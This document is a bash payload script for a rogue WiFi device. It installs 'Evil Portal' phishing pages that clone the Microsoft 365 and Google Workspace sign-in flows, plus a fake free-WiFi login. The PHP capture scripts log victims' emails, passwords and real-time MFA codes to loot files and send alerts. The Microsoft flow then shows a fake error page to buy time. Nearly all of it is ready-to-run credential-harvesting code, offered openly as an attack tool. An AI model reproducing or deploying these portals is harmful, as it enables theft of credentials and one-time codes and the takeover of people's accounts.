#!/bin/bash
# Title: LOKI - MFA Harvester Portal
# Description: Real-time credential and MFA token capture via Evil Portal
# Author: JMFH / FENRIR / HaleHound
# Version: 1.0.0
# Category: credential-harvesting
# Named after the Norse trickster god - master of deception

# === CONFIGURATION ===
LOKI_BASE="/root/portals/loki"
LOOT_DIR="/root/loot/loki"
PORTAL_DIR="/root/portals"
EVIL_PORTAL_API="/pineapple/ui/modules/evilportal/assets/api"

# Portal IP - will be detected or set
PORTAL_IP="172.16.52.1"

# === PORTAL TEMPLATES ===
declare -A PORTAL_NAMES
PORTAL_NAMES[1]="Microsoft 365"
PORTAL_NAMES[2]="Google Workspace"
PORTAL_NAMES[3]="WiFi Captive Portal"

# === CLEANUP ===
cleanup() {
    LED OFF 2>/dev/null
}
trap cleanup EXIT INT TERM

# === LED PATTERNS ===
led_setup() {
    LED R 255 G 165 B 0  # Orange = setup
}

led_active() {
    LED R 255 G 0 B 0  # Red = capturing
}

led_success() {
    LED R 0 G 255 B 0  # Green = success
}

# === HELPER FUNCTIONS ===

detect_portal_ip() {
    # Try to detect the portal IP from network config
    local ip=$(ip addr show br-lan 2>/dev/null | grep -oE 'inet [0-9.]+' | cut -d' ' -f2)
    [ -n "$ip" ] && PORTAL_IP="$ip"

    # Check for evil network
    local evil_ip=$(ip addr show br-evil 2>/dev/null | grep -oE 'inet [0-9.]+' | cut -d' ' -f2)
    [ -n "$evil_ip" ] && PORTAL_IP="$evil_ip"
}

check_evil_portal() {
    # Check if Evil Portal infrastructure is installed (not just payload)
    # After running install_evil_portal, these should exist:

    # Check 1: Init script exists
    if [ -f "/etc/init.d/evilportal" ]; then
        return 0
    fi

    # Check 2: PHP and nginx are available (alternate check)
    if command -v php >/dev/null 2>&1 || command -v php8 >/dev/null 2>&1; then
        if command -v nginx >/dev/null 2>&1; then
            return 0
        fi
    fi

    # Check 3: Evil Portal API exists
    if [ -d "/pineapple/ui/modules/evilportal" ]; then
        return 0
    fi

    return 1
}

check_evil_portal_payload() {
    # Check if Evil Portal payload exists (can be installed)
    if [ -d "/mmc/root/payloads/user/evil_portal" ] || [ -d "/root/payloads/user/evil_portal" ]; then
        return 0
    fi
    return 1
}

# === PORTAL INSTALLATION ===

install_microsoft_portal() {
    local portal_path="$PORTAL_DIR/loki_microsoft"
    mkdir -p "$portal_path"

    LOG "Installing Microsoft 365 MFA portal..."

    # index.php - Main phishing page
    cat > "$portal_path/index.php" << 'MSEOF'
<?php
header("Cache-Control: no-store, no-cache, must-revalidate");
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
$stage = isset($_GET['stage']) ? $_GET['stage'] : 'email';
$email = isset($_GET['email']) ? htmlspecialchars($_GET['email']) : '';
?>
<!DOCTYPE html>
<html>
<head>
    <title>Sign in to your account</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: #f2f2f2; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; width: 440px; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
        .logo { width: 108px; margin-bottom: 16px; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 12px; color: #1b1b1b; }
        .email-display { font-size: 14px; color: #666; margin-bottom: 24px; }
        input[type="email"], input[type="password"], input[type="text"] {
            width: 100%; padding: 10px 8px; font-size: 15px; border: 1px solid #666;
            margin-bottom: 16px; outline: none;
        }
        input:focus { border-color: #0067b8; }
        .submit-btn {
            background: #0067b8; color: white; border: none; padding: 10px 20px;
            font-size: 15px; cursor: pointer; float: right;
        }
        .submit-btn:hover { background: #005a9e; }
        .link { color: #0067b8; text-decoration: none; font-size: 13px; display: block; margin-bottom: 8px; }
        .mfa-info { font-size: 13px; color: #666; margin-bottom: 16px; line-height: 1.5; }
        .mfa-code { letter-spacing: 8px; font-size: 24px; text-align: center; }
        .error { color: #d83b01; font-size: 13px; margin-bottom: 12px; }
        .loader { display: none; text-align: center; padding: 20px; }
        .loader.active { display: block; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0067b8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 12px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="container">
    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDgiIGhlaWdodD0iMjQiPjxwYXRoIGZpbGw9IiNmMjUwMjIiIGQ9Ik0wIDBoMTEuNXYxMS41SDB6Ii8+PHBhdGggZmlsbD0iIzdmYmEwMCIgZD0iTTEyLjUgMEgyNHYxMS41SDEyLjV6Ii8+PHBhdGggZmlsbD0iIzAwYTRlZiIgZD0iTTAgMTIuNWgxMS41VjI0SDB6Ii8+PHBhdGggZmlsbD0iI2ZmYjkwMCIgZD0iTTEyLjUgMTIuNUgyNFYyNEgxMi41eiIvPjxwYXRoIGQ9Ik0zNiA1LjloMy43djEyLjZIMzZ6bTcuNyAwaDUuOGwyLjcgOS4gMi43LTkuMWg1LjZ2MTIuNmgtMy42VjguOGwtMi45IDkuN2gtMy44bC0yLjktOS43djkuN2gtMy42em0yMC43IDBoMy43djEyLjZoLTMuN3ptOC45IDBoMy44bDIuNiA0LjcgMi42LTQuN2gzLjhsLTQuNSA2LjMgNC44IDYuM2gtNC4xbC0yLjgtNC45LTIuOCA0LjloLTQuMWw0LjgtNi4zem0xNi42IDcuMmMwLTEuMS4yLTIuMS42LTMgLjQtLjkgMS0xLjcgMS44LTIuNHMxLjYtMS4xIDIuNi0xLjVjMS0uMyAyLS41IDMuMS0uNSAxLjEgMCAyLjIuMiAzLjIuNXMxLjguOCAyLjYgMS41YzEgLjcgMS40IDEuNSAxLjggMi40LjQuOS42IDEuOS42IDMgMCAxLjEtLjIgMi4xLS42IDMtLjQtLjktMS0xLjctMS44LTIuNHMtMS42LTEuMS0yLjYtMS41Yy0xLS4zLTItLjUtMy4yLS41LTEuMSAwLTIuMS4yLTMuMS41LS45LjQtMS44LjktMi42IDEuNS0uNy43LTEuMyAxLjUtMS44IDIuNC0uNC45LS42IDEuOS0uNiAzIDAgMS4xLjIgMi4xLjYgMyAuNC45IDEgMS43IDEuOCAyLjQuNy43IDEuNiAxLjIgMi42IDEuNSAxIC4zIDIgLjUgMy4xLjUgMS4xIDAgMi4yLS4yIDMuMi0uNXMxLjgtLjggMi42LTEuNWMuNy0uNyAxLjQtMS41IDEuOC0yLjQuNC0uOS42LTEuOS42LTN2LS4xYzAtLjEgMC0uMS0uMS0uMkg5Mi42djIuNmg1LjJjLS4xLjQtLjMuNy0uNiAxLS4zLjMtLjYuNi0xIC44cy0uOS40LTEuNC41Yy0uNS4xLTEgLjItMS42LjItLjcgMC0xLjQtLjEtMi0uNC0uNi0uMy0xLjItLjYtMS42LTEuMS0uNS0uNS0uOC0xLTEuMS0xLjctLjMtLjctLjQtMS40LS40LTIuMnoiLz48L3N2Zz4=" class="logo" alt="Microsoft">

    <?php if($stage == 'email'): ?>
    <h1>Sign in</h1>
    <form method="POST" action="capture.php">
        <input type="hidden" name="target" value="<?=$destination?>">
        <input type="hidden" name="stage" value="email">
        <input type="email" name="email" placeholder="Email, phone, or Skype" required autofocus>
        <a href="#" class="link">Can't access your account?</a>
        <a href="#" class="link">Sign-in options</a>
        <button type="submit" class="submit-btn">Next</button>
    </form>

    <?php elseif($stage == 'password'): ?>
    <a href="?stage=email" class="link" style="margin-bottom:16px;">&larr; <?=$email?></a>
    <h1>Enter password</h1>
    <form method="POST" action="capture.php">
        <input type="hidden" name="target" value="<?=$destination?>">
        <input type="hidden" name="stage" value="password">
        <input type="hidden" name="email" value="<?=$email?>">
        <input type="password" name="password" placeholder="Password" required autofocus>
        <a href="#" class="link">Forgot my password</a>
        <button type="submit" class="submit-btn">Sign in</button>
    </form>

    <?php elseif($stage == 'mfa'): ?>
    <h1>Verify your identity</h1>
    <p class="mfa-info">We need to verify your identity. Enter the code from your authenticator app or SMS.</p>
    <form method="POST" action="capture.php" id="mfaForm">
        <input type="hidden" name="target" value="<?=$destination?>">
        <input type="hidden" name="stage" value="mfa">
        <input type="hidden" name="email" value="<?=$email?>">
        <input type="text" name="mfa_code" class="mfa-code" placeholder="______" maxlength="6" pattern="[0-9]{6}" required autofocus>
        <a href="#" class="link">I can't use my authenticator app right now</a>
        <button type="submit" class="submit-btn">Verify</button>
    </form>
    <div class="loader" id="loader">
        <div class="spinner"></div>
        <p>Verifying...</p>
    </div>

    <?php elseif($stage == 'error'): ?>
    <h1>Something went wrong</h1>
    <p class="error">We couldn't verify your identity. Please try again.</p>
    <a href="?stage=mfa&email=<?=urlencode($email)?>" class="submit-btn" style="text-decoration:none;display:inline-block;">Try again</a>

    <?php endif; ?>
</div>
<script>
document.getElementById('mfaForm')?.addEventListener('submit', function(e) {
    document.getElementById('loader').classList.add('active');
    this.style.display = 'none';
});
</script>
</body>
</html>
MSEOF

    # capture.php - Credential capture
    cat > "$portal_path/capture.php" << 'CAPTEOF'
<?php
namespace evilportal;

header("Cache-Control: no-store, no-cache, must-revalidate");
require_once('/pineapple/ui/modules/evilportal/assets/api/Portal.php');
require_once('MyPortal.php');

$loot_file = '/root/loot/loki/microsoft_creds.txt';
$stage = isset($_POST['stage']) ? $_POST['stage'] : '';
$email = isset($_POST['email']) ? $_POST['email'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$mfa_code = isset($_POST['mfa_code']) ? $_POST['mfa_code'] : '';
$target = isset($_POST['target']) ? $_POST['target'] : '/';
$client_ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');

// Ensure loot directory exists
@mkdir('/root/loot/loki', 0755, true);

if ($stage == 'email' && !empty($email)) {
    // Log email and redirect to password stage
    file_put_contents($loot_file, "[$timestamp] EMAIL: $email (IP: $client_ip)\n", FILE_APPEND);
    header("Location: index.php?stage=password&email=" . urlencode($email));
    exit;
}

if ($stage == 'password' && !empty($email) && !empty($password)) {
    // Log password and redirect to MFA stage
    file_put_contents($loot_file, "[$timestamp] PASSWORD: $password (Email: $email)\n", FILE_APPEND);

    // Send notification
    exec("PYTHONPATH=/usr/lib/pineapple; export PYTHONPATH; /usr/bin/python3 /usr/bin/notify info 'LOKI: Credentials captured for $email' evilportal &");

    header("Location: index.php?stage=mfa&email=" . urlencode($email));
    exit;
}

if ($stage == 'mfa' && !empty($mfa_code)) {
    // Log MFA code
    file_put_contents($loot_file, "[$timestamp] MFA_CODE: $mfa_code (Email: $email)\n", FILE_APPEND);
    file_put_contents($loot_file, "[$timestamp] === COMPLETE CAPTURE ===\n\n", FILE_APPEND);

    // Send critical notification
    exec("PYTHONPATH=/usr/lib/pineapple; export PYTHONPATH; /usr/bin/python3 /usr/bin/notify critical 'LOKI: MFA TOKEN CAPTURED for $email: $mfa_code' evilportal &");

    // Authorize the client
    $portal = new MyPortal((object)$_POST);
    $portal->authorizeClient($client_ip);

    // Redirect to target or show error (to buy time)
    header("Location: index.php?stage=error&email=" . urlencode($email));
    exit;
}

// Default redirect
header("Location: index.php");
CAPTEOF

    # MyPortal.php - Portal class
    cat > "$portal_path/MyPortal.php" << 'PORTALEOF'
<?php namespace evilportal;

class MyPortal extends Portal
{
    public function handleAuthorization()
    {
        // Custom handling - credentials captured in capture.php
        if (isset($this->request->target)) {
            parent::handleAuthorization();
        }
    }

    public function authorizeClient($clientIP)
    {
        return parent::authorizeClient($clientIP);
    }

    public function onSuccess()
    {
        $this->notify("LOKI: Client authorized after MFA capture");
    }
}
PORTALEOF

    # helper.php
    cat > "$portal_path/helper.php" << 'HELPEOF'
<?php
function getClientMac($clientIP) {
    return trim(exec("grep " . escapeshellarg($clientIP) . " /tmp/dhcp.leases | awk '{print $2}'"));
}

function getClientHostName($clientIP) {
    return trim(exec("grep " . escapeshellarg($clientIP) . " /tmp/dhcp.leases | awk '{print $4}'"));
}
HELPEOF

    # Portal config
    cat > "$portal_path/loki_microsoft.ep" << 'EPEOF'
{
  "name": "loki_microsoft",
  "type": "advanced"
}
EPEOF

    # Captive portal detection files
    cat > "$portal_path/generate_204" << GENEOF
<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=http://${PORTAL_IP}/"></head><body></body></html>
GENEOF

    cp "$portal_path/generate_204" "$portal_path/hotspot-detect.html"

    chmod -R 755 "$portal_path"
    LOG "Microsoft 365 portal installed at $portal_path"
}

install_google_portal() {
    local portal_path="$PORTAL_DIR/loki_google"
    mkdir -p "$portal_path"

    LOG "Installing Google Workspace MFA portal..."

    # index.php - Google-style phishing page
    cat > "$portal_path/index.php" << 'GEOF'
<?php
header("Cache-Control: no-store, no-cache, must-revalidate");
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
$stage = isset($_GET['stage']) ? $_GET['stage'] : 'email';
$email = isset($_GET['email']) ? htmlspecialchars($_GET['email']) : '';
?>
<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; }
        .logo { width: 75px; margin: 0 auto 16px; display: block; }
        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; color: #202124; }
        .subtitle { text-align: center; font-size: 16px; color: #5f6368; margin-bottom: 32px; }
        .email-chip { background: #f1f3f4; border-radius: 16px; padding: 4px 8px 4px 4px; display: inline-flex; align-items: center; margin-bottom: 24px; font-size: 14px; }
        .email-chip img { width: 24px; height: 24px; border-radius: 50%; margin-right: 8px; }
        input[type="email"], input[type="password"], input[type="text"] {
            width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0;
            border-radius: 4px; margin-bottom: 8px; outline: none;
        }
        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
        .input-label { font-size: 12px; color: #5f6368; margin-bottom: 24px; display: block; }
        .submit-btn {
            background: #1a73e8; color: white; border: none; padding: 10px 24px;
            font-size: 14px; font-weight: 500; cursor: pointer; border-radius: 4px;
            float: right;
        }
        .submit-btn:hover { background: #1557b0; box-shadow: 0 1px 2px rgba(0,0,0,0.3); }
        .link { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
        .link:hover { background: #e8f0fe; padding: 8px; margin: -8px; border-radius: 4px; }
        .footer { display: flex; justify-content: space-between; margin-top: 32px; clear: both; padding-top: 24px; }
        .mfa-info { font-size: 14px; color: #5f6368; margin-bottom: 24px; line-height: 1.5; }
        .mfa-code { letter-spacing: 12px; font-size: 28px; text-align: center; font-weight: 500; }
    </style>
</head>
<body>
<div class="container">
    <svg class="logo" viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg"><g fill="none"><path d="M0 19.5V4.1h4c1.3 0 2.4.4 3.2 1.1.8.8 1.3 1.8 1.3 3s-.5 2.2-1.3 3c-.8.7-1.9 1.1-3.2 1.1H2.3v7.2H0zm2.3-9.4h1.5c.8 0 1.5-.2 2-.6.5-.4.8-1 .8-1.8s-.3-1.3-.8-1.8c-.5-.4-1.2-.6-2-.6H2.3v4.8z" fill="#4285F4"/><path d="M15.7 19.7c-1.6 0-2.9-.5-3.9-1.6-1-.7-1.5-2.5-1.5-4.3 0-1.7.5-3.2 1.5-4.3 1-1.1 2.3-1.6 3.9-1.6s2.9.5 3.9 1.6c1 1.1 1.5 2.5 1.5 4.3 0 1.7-.5 3.2-1.5 4.3-1 1.1-2.3 1.6-3.9 1.6zm0-2c.9 0 1.7-.3 2.3-1 .6-.7.9-1.7.9-2.9 0-1.2-.3-2.2-.9-2.9-.6-.7-1.4-1-2.3-1s-1.7.3-2.3 1c-.6.7-.9 1.7-.9 2.9 0 1.2.3 2.2.9 2.9.6.7 1.4 1 2.3 1z" fill="#EA4335"/><path d="M28.4 19.7c-1.6 0-2.9-.5-3.9-1.6-1-1.1-1.5-2.5-1.5-4.3 0-1.7.5-3.2 1.5-4.3 1-1.1 2.3-1.6 3.9-1.6s2.9.5 3.9 1.6c1 1.1 1.5 2.5 1.5 4.3 0 1.7-.5 3.2-1.5 4.3-1 1.1-2.3 1.6-3.9 1.6zm0-2c.9 0 1.7-.3 2.3-1 .6-.7.9-1.7.9-2.9 0-1.2-.3-2.2-.9-2.9-.6-.7-1.4-1-2.3-1s-1.7.3-2.3 1c-.6.7-.9 1.7-.9 2.9 0 1.2.3 2.2.9 2.9.6.7 1.4 1 2.3 1z" fill="#FBBC05"/><path d="M41.1 19.7c-1.5 0-2.8-.5-3.8-1.6-1-1-1.5-2.4-1.5-4.2 0-1.9.5-3.3 1.6-4.4 1.1-1.1 2.4-1.6 4-1.6 1.3 0 2.4.4 3.2 1.1l-1.3 1.6c-.6-.5-1.2-.8-2-.8-.9 0-1.7.3-2.3 1-.6.7-.9 1.6-.9 2.9s.3 2.2.9 2.9c.6.7 1.3 1 2.2 1 .9 0 1.6-.3 2.2-.9l1.3 1.6c-.5.5-1 .8-1.6 1-.6.3-1.3.4-2 .4z" fill="#4285F4"/><path d="M46.8 19.5V4.1H49v15.4h-2.2z" fill="#34A853"/><path d="M56.7 19.7c-1.6 0-2.8-.5-3.8-1.6-1-1.1-1.5-2.5-1.5-4.2 0-1.8.5-3.3 1.4-4.4.9-1.1 2.2-1.6 3.7-1.6 1.5 0 2.6.5 3.5 1.5.9 1 1.3 2.3 1.3 4v.9h-7.6c0 1 .3 1.8.9 2.4.6.6 1.3.9 2.2.9.7 0 1.2-.1 1.7-.3.5-.2.9-.5 1.3-.9l1.2 1.4c-1 1.2-2.5 1.9-4.3 1.9zm-.2-10c-.7 0-1.3.2-1.8.7-.5.5-.8 1.2-.9 2.1h5.2c0-.9-.2-1.6-.7-2.1-.4-.5-1-.7-1.8-.7z" fill="#EA4335"/></g></svg>

    <?php if($stage == 'email'): ?>
    <h1>Sign in</h1>
    <p class="subtitle">Use your Google Account</p>
    <form method="POST" action="capture.php">
        <input type="hidden" name="target" value="<?=$destination?>">
        <input type="hidden" name="stage" value="email">
        <input type="email" name="email" placeholder="Email or phone" required autofocus>
        <span class="input-label"><a href="#" class="link">Forgot email?</a></span>
        <div class="footer">
            <a href="#" class="link">Create account</a>
            <button type="submit" class="submit-btn">Next</button>
        </div>
    </form>

    <?php elseif($stage == 'password'): ?>
    <h1>Welcome</h1>
    <div class="email-chip">
        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0Ij48cGF0aCBmaWxsPSIjNWY2MzY4IiBkPSJNMTIgMkM2LjQ4IDIgMiA2LjQ4IDIgMTJzNC40OCAxMCAxMCAxMCAxMC00LjQ4IDEwLTEwUzE3LjUyIDIgMTIgMnptMCAzYzEuNjYgMCAzIDEuMzQgMyAzcy0xLjM0IDMtMyAzLTMtMS4zNC0zLTMgMS4zNC0zIDMtM3ptMCAxNC4yYy0yLjUgMC00LjcxLTEuMjgtNi0zLjIyLjAzLTEuOTkgNC0zLjA4IDYtMy4wOCAxLjk5IDAgNS45NyAxLjA5IDYgMy4wOC0xLjI5IDEuOTQtMy41IDMuMjItNiAzLjIyeiIvPjwvc3ZnPg==" alt="">
        <?=$email?>
    </div>
    <form method="POST" action="capture.php">
        <input type="hidden" name="target" value="<?=$destination?>">
        <input type="hidden" name="stage" value="password">
        <input type="hidden" name="email" value="<?=$email?>">
        <input type="password" name="password" placeholder="Enter your password" required autofocus>
        <span class="input-label"><a href="#" class="link">Forgot password?</a></span>
        <div class="footer">
            <span></span>
            <button type="submit" class="submit-btn">Next</button>
        </div>
    </form>

    <?php elseif($stage == 'mfa'): ?>
    <h1>2-Step Verification</h1>
    <p class="mfa-info">Enter the verification code from your phone or authenticator app.</p>
    <form method="POST" action="capture.php">
        <input type="hidden" name="target" value="<?=$destination?>">
        <input type="hidden" name="stage" value="mfa">
        <input type="hidden" name="email" value="<?=$email?>">
        <input type="text" name="mfa_code" class="mfa-code" placeholder="G-" maxlength="6" pattern="[0-9]{6}" required autofocus>
        <span class="input-label"><a href="#" class="link">Try another way</a></span>
        <div class="footer">
            <span></span>
            <button type="submit" class="submit-btn">Next</button>
        </div>
    </form>
    <?php endif; ?>
</div>
</body>
</html>
GEOF

    # Copy capture.php from Microsoft (same logic)
    sed 's/microsoft_creds/google_creds/g' "$PORTAL_DIR/loki_microsoft/capture.php" > "$portal_path/capture.php"
    cp "$PORTAL_DIR/loki_microsoft/MyPortal.php" "$portal_path/"
    cp "$PORTAL_DIR/loki_microsoft/helper.php" "$portal_path/"

    cat > "$portal_path/loki_google.ep" << 'EPEOF'
{
  "name": "loki_google",
  "type": "advanced"
}
EPEOF

    cat > "$portal_path/generate_204" << GENEOF
<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=http://${PORTAL_IP}/"></head><body></body></html>
GENEOF
    cp "$portal_path/generate_204" "$portal_path/hotspot-detect.html"

    chmod -R 755 "$portal_path"
    LOG "Google Workspace portal installed at $portal_path"
}

install_wifi_portal() {
    local portal_path="$PORTAL_DIR/loki_wifi"
    mkdir -p "$portal_path"

    LOG "Installing WiFi captive portal..."

    # Simple WiFi portal that asks for email/password for "free wifi"
    cat > "$portal_path/index.php" << 'WIFIEOF'
<?php
header("Cache-Control: no-store, no-cache, must-revalidate");
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
$stage = isset($_GET['stage']) ? $_GET['stage'] : 'login';
?>
<!DOCTYPE html>
<html>
<head>
    <title>Free WiFi - Sign In</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; width: 380px; padding: 40px; border-radius: 12px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
        .wifi-icon { font-size: 48px; text-align: center; margin-bottom: 16px; }
        h1 { font-size: 24px; text-align: center; margin-bottom: 8px; color: #333; }
        .subtitle { text-align: center; color: #666; margin-bottom: 32px; font-size: 14px; }
        input { width: 100%; padding: 14px 16px; font-size: 16px; border: 2px solid #e1e1e1; border-radius: 8px; margin-bottom: 16px; outline: none; transition: border-color 0.3s; }
        input:focus { border-color: #667eea; }
        .submit-btn { width: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 14px; font-size: 16px; font-weight: 600; cursor: pointer; border-radius: 8px; transition: transform 0.2s, box-shadow 0.2s; }
        .submit-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(102,126,234,0.4); }
        .terms { font-size: 12px; color: #999; text-align: center; margin-top: 16px; }
        .terms a { color: #667eea; }
        .success { text-align: center; }
        .success .check { font-size: 64px; margin-bottom: 16px; }
    </style>
</head>
<body>
<div class="container">
    <?php if($stage == 'login'): ?>
    <div class="wifi-icon">📶</div>
    <h1>Free WiFi Access</h1>
    <p class="subtitle">Sign in with your email to connect</p>
    <form method="POST" action="capture.php">
        <input type="hidden" name="target" value="<?=$destination?>">
        <input type="hidden" name="stage" value="wifi">
        <input type="email" name="email" placeholder="Email address" required>
        <input type="password" name="password" placeholder="Create a password">
        <button type="submit" class="submit-btn">Connect to WiFi</button>
    </form>
    <p class="terms">By connecting, you agree to our <a href="#">Terms of Service</a></p>

    <?php elseif($stage == 'success'): ?>
    <div class="success">
        <div class="check">✅</div>
        <h1>Connected!</h1>
        <p class="subtitle">You now have internet access. Enjoy!</p>
    </div>
    <?php endif; ?>
</div>
</body>
</html>
WIFIEOF

    # capture.php for WiFi portal
    cat > "$portal_path/capture.php" << 'WCAPTEOF'
<?php
namespace evilportal;

header("Cache-Control: no-store, no-cache, must-revalidate");
require_once('/pineapple/ui/modules/evilportal/assets/api/Portal.php');
require_once('MyPortal.php');

$loot_file = '/root/loot/loki/wifi_creds.txt';
$email = isset($_POST['email']) ? $_POST['email'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$client_ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');

@mkdir('/root/loot/loki', 0755, true);

if (!empty($email)) {
    $log_entry = "[$timestamp] IP: $client_ip | Email: $email";
    if (!empty($password)) {
        $log_entry .= " | Password: $password";
    }
    file_put_contents($loot_file, "$log_entry\n", FILE_APPEND);

    exec("PYTHONPATH=/usr/lib/pineapple; export PYTHONPATH; /usr/bin/python3 /usr/bin/notify info 'LOKI: WiFi credentials captured - $email' evilportal &");

    // Authorize client
    $portal = new MyPortal((object)$_POST);
    $portal->authorizeClient($client_ip);
}

header("Location: index.php?stage=success");
WCAPTEOF

    cp "$PORTAL_DIR/loki_microsoft/MyPortal.php" "$portal_path/"
    cp "$PORTAL_DIR/loki_microsoft/helper.php" "$portal_path/"

    cat > "$portal_path/loki_wifi.ep" << 'EPEOF'
{
  "name": "loki_wifi",
  "type": "basic"
}
EPEOF

    cat > "$portal_path/generate_204" << GENEOF
<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=http://${PORTAL_IP}/"></head><body></body></html>
GENEOF
    cp "$portal_path/generate_204" "$portal_path/hotspot-detect.html"

    chmod -R 755 "$portal_path"
    LOG "WiFi captive portal installed at $portal_path"
}

activate_portal() {
    local portal_name=$1
    local portal_path="$PORTAL_DIR/$portal_name"

    LOG "Activating portal: $portal_name"

    # Create symlinks for Evil Portal
    rm -f /www/index.php /www/MyPortal.php /www/helper.php /www/capture.php
    ln -sf "$portal_path/index.php" /www/index.php
    ln -sf "$portal_path/MyPortal.php" /www/MyPortal.php
    ln -sf "$portal_path/helper.php" /www/helper.php
    ln -sf "$portal_path/capture.php" /www/capture.php
    ln -sf "$portal_path/generate_204" /www/generate_204
    ln -sf "$portal_path/hotspot-detect.html" /www/hotspot-detect.html

    # Restart Evil Portal if running
    if pgrep -f "evilportal" > /dev/null; then
        /etc/init.d/evilportal restart 2>/dev/null
    fi

    LOG "Portal $portal_name activated"
}

# === MAIN EXECUTION ===

LOG ""
LOG " _    ___  _  _____"
LOG "| |  / _ \\| |/ /_ _|"
LOG "| |_| (_) | ' < | | "
LOG "|____\\___/|_|\\_\\___|"
LOG ""
LOG " MFA Harvester Portal v1.0"
LOG " The Trickster God"
LOG ""

# Check Evil Portal
if ! check_evil_portal; then
    if check_evil_portal_payload; then
        ERROR_DIALOG "Evil Portal not installed yet!

The Evil Portal PAYLOAD exists but hasn't been run.

Go to:
Payloads > evil_portal > install_evil_portal

Then run LOKI again."
    else
        ERROR_DIALOG "Evil Portal not found!

LOKI requires Evil Portal to be installed.

Please install the Evil Portal payload first."
    fi
    exit 1
fi

# Detect portal IP
detect_portal_ip

# Setup
led_setup
mkdir -p "$LOOT_DIR"

PROMPT "LOKI installs credential harvesting portals with MFA capture capability.

Portal IP: $PORTAL_IP

Press OK to select a portal template."

# Portal selection menu
LOG ""
LOG "Select Portal Template:"
LOG "1. Microsoft 365 (MFA)"
LOG "2. Google Workspace (MFA)"
LOG "3. WiFi Captive Portal"
LOG ""

portal_choice=$(NUMBER_PICKER "Select Portal (1-3)" 1)
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        LOG "Cancelled"
        exit 1
        ;;
esac

[ -z "$portal_choice" ] && portal_choice=1
[ $portal_choice -lt 1 ] && portal_choice=1
[ $portal_choice -gt 3 ] && portal_choice=3

portal_name="${PORTAL_NAMES[$portal_choice]}"

# Confirmation
DIALOG_RESULT=$(CONFIRMATION_DIALOG "Install $portal_name portal?")
if [ "$DIALOG_RESULT" != "1" ]; then
    LOG "Cancelled"
    exit 0
fi

LOG "Installing $portal_name portal..."

# Install selected portal
case $portal_choice in
    1)
        install_microsoft_portal
        activate_portal "loki_microsoft"
        ;;
    2)
        install_google_portal
        activate_portal "loki_google"
        ;;
    3)
        install_wifi_portal
        activate_portal "loki_wifi"
        ;;
esac

led_active

LOG ""
LOG "=== LOKI ACTIVE ==="
LOG "Portal: $portal_name"
LOG "URL: http://$PORTAL_IP/"
LOG "Loot: $LOOT_DIR"
LOG ""
LOG "Credentials will be logged to:"
LOG "$LOOT_DIR/"
LOG ""

ALERT "LOKI Portal Active!

$portal_name

Victims connecting to your network will see this portal.

Credentials saved to:
$LOOT_DIR"

exit 0
